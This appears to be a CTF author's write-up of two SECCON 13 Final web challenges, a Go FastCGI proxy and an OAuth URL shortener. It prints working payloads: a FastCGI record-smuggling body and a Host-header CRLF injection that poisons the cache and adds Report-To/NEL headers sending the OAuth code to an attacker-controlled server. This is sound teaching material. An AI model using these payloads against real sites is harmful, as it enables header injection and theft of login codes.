# SECCON 13 CTF Final 作問記

> 原文: https://www.ctfiot.com/230944.html
> ID: 230944


```
.
├── child
│ ├── child.go
│ └── Dockerfile
├── compose.yaml
├── nginx.conf
└── server
 ├── Dockerfile
 ├── fcgi.go
 ├── go.mod
 └── main.go
```



```
events {
 worker_connections 1024;
}

http {
 server {
 listen 80;
 server_name localhost;

 # Block requests containing GiveMeFlag in headers
 if ($http_givemeflag) {
 return 403;
 }

 # Forward all other requests to port 9090
 location / {
 proxy_pass http://server:9090;
 }
 }
}
```



```
func handleRequest(params map[string]string, body []byte) string {

	if params["HTTP_GIVEMEFLAG"] == "true" {
 return "Content-type: text/plain\r\n\r\nOh, you want the flag? Here you go: " + os.Getenv("FLAG")
	}

	response := fmt.Sprintf("Content-type: text/plain\r\n\r\nReceived FastCGI Request\n\nParams:\n")
	for key, value := range params {
 response += fmt.Sprintf("%s: %s\n", key, value)
	}
	response += fmt.Sprintf("\nBody length: %d\n", len(body))

	return response
}
```



```
func main() {

 server := NewFastCGIServer(
 "child:9000", // FastCGI application address
 )

 // Create HTTP server
 http.Handle("/", server)

 slog.Info("Starting server on :9090")
 if err := http.ListenAndServe(":9090", nil); err != nil {
 slog.Error("Failed to start server", "error", err)
 }
}
```



```
func (s *FastCGIServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {

 if r.Header.Get("Givemeflag") != "" {
 w.Header().Set("Content-Type", "text/plain")
 w.WriteHeader(http.StatusForbidden)
 w.Write([]byte("You are not allowed to access this resource"))
 return
 }

 // Create FastCGI client
 client, err := NewClient("tcp", s.FcgiAddr)
 if err != nil {
 http.Error(w, "Failed to connect to FastCGI application", http.StatusBadGateway)
 slog.Error("FastCGI connection error", "error", err)
 return
 }

 [...]

 // Send request to FastCGI application
 response, err := client.Do(fcgiReq)
 if err != nil {
 http.Error(w, "Failed to process request", http.StatusBadGateway)
 slog.Error("FastCGI request error", "error", err)
 return
 }
 [...]
}
```



```
const (
	FCGI_BEGIN_REQUEST = 1
	FCGI_ABORT_REQUEST = 2
	FCGI_END_REQUEST = 3
	FCGI_PARAMS = 4
	FCGI_STDIN = 5
	FCGI_STDOUT = 6
	FCGI_STDERR = 7
	FCGI_DATA = 8

	FCGI_RESPONDER = 1
	FCGI_VERSION_1 = 1
)

type header struct {
	Version uint8
	Type uint8
	RequestID uint16
	ContentLength uint16
	PaddingLength uint8
	Reserved uint8
}

type Client struct {
	conn net.Conn
}
```



```
func (c *Client) writeStdin(requestID uint16, content []byte) error {
	contentSize := len(content)

	h := header{
 Version: FCGI_VERSION_1,
 Type: FCGI_STDIN,
 RequestID: requestID,
 ContentLength: uint16(contentSize),
 PaddingLength: 0,
	}
	[...]
}
```



```
if _, err := c.conn.Write(content); err != nil {
 return err
	}
```



```
if err := binary.Read(reader, binary.BigEndian, h); err != nil {
 if err != io.EOF {
 slog.Error("Error reading header", "error", err)
 }
 return
 }
```



```
a\x01\x04\x00\x01\x00\x15\x00\x00\x0f\x04HTTP_GIVEMEFLAGtrue\x01\x05\x00\x01\x00\x00\x00\x00[65499バイトのa]
```



```
.
├── admin
│   ├── Dockerfile
│   ├── requirements.txt
│   ├── server.py
│   └── utils
│   ├── auth.py
│   └── utils.py
├── app
│   ├── config
│   │   └── database.py
│   ├── Dockerfile
│   ├── handlers
│   │   └── http_handler.py
│   ├── models
│   │   └── url.py
│   ├── requirements.txt
│   ├── server.py
│   ├── services
│   │   └── shortener.py
│   ├── static
│   │   ├── css
│   │   │   └── style.css
│   │   ├── index.html
│   │   └── js
│   │   └── main.js
│   └── utils
│   ├── auth.py
│   ├── token.py
│   └── utils.py
├── auth
│   ├── Dockerfile
│   ├── package.json
│   ├── package-lock.json
│   ├── server.js
│   └── views
│   ├── home.ejs
│   ├── login.ejs
│   └── register.ejs
├── bot
│   ├── bot.js
│   ├── Dockerfile
│   ├── index.js
│   ├── package.json
│   ├── package-lock.json
│   ├── public
│   │   └── index.html
│   └── server.crt
├── certs
│   ├── server.crt
│   └── server.key
├── compose.yaml
├── nginx.conf
└── README.md
```



```
Can you access our admin dashboard?

- App: `https://app.{SECCON_HOST}`
- Auth: `https://auth.{SECCON_HOST}`
- Admin: `https://admin.{SECCON_HOST}`
- Admin bot: `http://{SECCON_HOST}:1337`

*"But this domain isn't short"*? Well, I don't have a budget to purchase a short domain :/
```



```
@app.route('/auth/callback')
def handle_callback():
 user_data = exchange_user_data(request)
 if not user_data:
 return send_security_headers(make_response('Invalid code or state', 401))

 if user_data.get('user_id') == 1 and user_data.get('username') == 'admin' and user_data.get('is_admin'):
 return send_security_headers(make_response(f'Congratulations! Here is your flag: {FLAG}'))
 else:
 return send_security_headers(make_response("You're not allowed to access this page", 401))
```



```
def exchange_user_data(req) -> Optional[dict]:
 code = req.args.get('code')
 state = req.args.get('state')
 if not code or not state:
 return None

 if state != get_state_from_cookie(req.headers.get('Cookie')):
 return None

 conn = http.client.HTTPConnection('auth', 3000)

 conn.request('GET', f'/auth/id?code={code}&login_target=ADMIN')
 response = conn.getresponse()

 if response.status != 200:
 return None

 user_data = json.loads(response.read().decode())
 conn.close()

 return user_data
```



```
const LOGIN_TARGETS = new Map([
 ['ADMIN', ADMIN_URL + '/auth/callback'],
 ['APP', APP_URL + '/auth/callback']
]);
```



```
from http.server import ThreadingHTTPServer
```



```
Warning: http.server is not recommended for production. It only implements basic security checks.
```



```
def send_header(self, keyword, value):
 """Send a MIME header to the headers buffer."""
 if self.request_version != 'HTTP/0.9':
 if not hasattr(self, '_headers_buffer'):
 self._headers_buffer = []
 self._headers_buffer.append(
 ("%s: %s\r\n" % (keyword, value)).encode('latin-1', 'strict'))
```



```
original_url = URLShortener.get_original_url(short_code)

 if original_url:
 parsed_url = urllib.parse.urlparse(original_url)
 normalized_url = parsed_url.geturl()

 if parsed_url.scheme != 'http' and parsed_url.scheme != 'https':
 normalized_url = 'https://' + get_header(self, "Host") + '/' + normalized_url

 self.send_contents(302, {
 'Content-Length': '0',
 'Location': normalized_url
 }, '')
```



```
# Unsafe bytes to be removed per WHATWG spec
_UNSAFE_URL_BYTES_TO_REMOVE = ['\t', '\r', '\n']

[...]

def _urlsplit(url, scheme=None, allow_fragments=True):
 # Only lstrip url as some applications rely on preserving trailing space.
 # (https://url.spec.whatwg.org/#concept-basic-url-parser would strip both)
 url = url.lstrip(_WHATWG_C0_CONTROL_OR_SPACE)
 for b in _UNSAFE_URL_BYTES_TO_REMOVE:
 url = url.replace(b, "")
```



```
if parsed_url.scheme != 'http' and parsed_url.scheme != 'https':
 normalized_url = 'https://' + get_header(self, "Host") + '/' + normalized_url
```



```
def get_header(request, header_name):
 return urllib.parse.unquote(request.headers.get(header_name))
```



```
server {
 listen 443 default_server ssl;

 ssl_certificate /etc/nginx/certs/fullchain.pem;
 ssl_certificate_key /etc/nginx/certs/privkey.pem;

 return 404;
 }
```



```
static ngx_int_t
ngx_http_process_host(ngx_http_request_t *r, ngx_table_elt_t *h,
 ngx_uint_t offset)
{
 [...]

 host = h->value;

 rc = ngx_http_validate_host(&host, r->pool, 0);

 [...]

 if (ngx_http_set_virtual_server(r, &host) == NGX_ERROR) {
 return NGX_ERROR;
 }

 [...]
}
```



```
ngx_int_t
ngx_http_validate_host(ngx_str_t *host, ngx_pool_t *pool, ngx_uint_t alloc)
{
 [...]

 h = host->data;

 state = sw_usual;

 for (i = 0; i < host->len; i++) {
 ch = h[i];

 switch (ch) {
 [...]
 case ':':
 if (state == sw_usual) {
 host_len = i;
 state = sw_rest;
 }
 break;
 [...]
 }

 [...]

 host->len = host_len;

 return NGX_OK;
}
```



```
Host: app:%0d%0ahogehoge
```



```
proxy_cache_path /var/cache/nginx levels=1:2 keys_zone=static_cache:10m max_size=10g inactive=60m use_temp_path=off;

 server {
 listen 443 ssl;
 server_name ${APP_HOSTNAME};
 [...]
 location /static {
 proxy_pass http://app:8000;
 proxy_set_header Host $http_host;
 proxy_set_header X-Forwarded-For $remote_addr;
 proxy_cache static_cache;
 proxy_cache_valid any 5m;
 add_header X-Cache-Status $upstream_cache_status;
 expires 1h;
 }
 }
```



```
if parsed_path.path.startswith('/static/'):
 self.path = parsed_path.path[len('/static/'):]
 return SimpleHTTPRequestHandler.do_GET(self)
```



```
HTTP/1.1 302 Found
Server: nginx/1.27.4
Date: Sat, 29 Mar 2025 08:44:04 GMT
Content-Length: 0
Connection: keep-alive
Content-Security-Policy: default-src 'none'; form-action 'none'; script-src-elem 'sha256-AGjXyjxFrQZsoMhDB11IRItDa6oGZdwALkCRHUTaGhc='; style-src-elem 'self'; connect-src 'self';
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Location: https://app.example.com:
injected: test/example.com
Expires: Sat, 29 Mar 2025 09:44:04 GMT
Cache-Control: max-age=3600
X-Cache-Status: HIT
```



```
Report-To: { "group": "endpoints",
 "max_age": 68400,
 "endpoints": [
 { "url": "https://example.com/reports" }
 ] }
```



```
elif parsed_path.path == '/auth/callback':
 user_data = exchange_user_data(self)
 if not user_data:
 self.send_error(401, 'Invalid code or state')
 return

 token = create_jwt_token(user_data)
 self.send_contents(302, {
 'Content-Length': '0',
 'Set-Cookie': f'jwt_token={token}; HttpOnly; SameSite=Lax; Path=/',
 'Location': '/'
 }, '')
 return
```



```
def exchange_user_data(req) -> Optional[dict]:
 parsed_url = urllib.parse.urlparse(req.path)
 query_params = urllib.parse.parse_qs(parsed_url.query)
 code = query_params.get('code', [None])[0]
 state = query_params.get('state', [None])[0]
 if not code or not state:
 return None
 
 if state != get_state_from_cookie(req.headers.get('Cookie')):
 return None
 [...]
```



```
Host: app.${BASE_HOSTNAME}:@auth.${BASE_HOSTNAME}%2Fauth%2Flogin?login_target=APP&state=asdf%0d%0aReport-To:%20{"group":"test","max_age":600,"endpoints":[{"url":"攻撃者の制御するサーバー"}]}%0d%0aNEL:%20{"report_to":"test","max_age":600}%0d%0aa:%20
```



```
GET /auth/callback?code=接種した「code」パラメーター%26login_target=APP%23&state=a
Host: admin.example.com
Cookie: state=a
[...]
```



```
Report-To: {"group":"test","max_age":600,"endpoints":[{"url":"攻撃者の制御するサーバー"}]}
NEL: {"report_to":"test","max_age":600}
```



```
original_url = URLShortener.get_original_url(short_code)

 if original_url:
 parsed_url = urllib.parse.urlparse(original_url)
 if parsed_url.scheme != 'http' and parsed_url.scheme != 'https':
 original_url = 'https://' + get_header(self, "Host") + '/' + parsed_url.geturl()

 self.send_contents(302, {
 'Content-Length': '0',
 'Location': original_url
 }, '')
 return
```
